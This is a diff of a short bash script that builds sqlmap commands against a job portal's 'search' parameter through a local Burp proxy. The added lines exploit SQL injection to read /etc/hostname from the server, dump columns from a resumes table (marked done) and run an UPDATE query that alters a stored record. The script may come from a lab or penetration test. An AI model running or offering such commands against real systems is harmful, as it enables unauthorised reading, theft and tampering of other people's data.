@@ -1,7 +1,19 @@
 #!/bin/bash
 
 #Burp proxy
-PROXY=http://127.0.0.1:8082
+PROXY=http://127.0.0.1:8080
+mymap='sqlmap -vvv --threads=10 -r resumes.req -p search --dbms=mysql --technique=B --no-cast --ignore-redirects'
+set -x
+$mymap --file-read=/etc/hostname
+set +x
+exit 0
+
+#DONE $mymap --flush-session -D job_portal -T resumes -C upload_date,id,user_id,file_name --dump
+$mymap --flush-session --level 5 --risk 3 -D job_portal --sql-query="UPDATE resumes SET file_name='ahoj.pdf' WHERE id='5'"
+exit 0
+
+sqlmap -v -r search.req
+exit 0
 echo "TODO under construction ..."
 exit 0
 
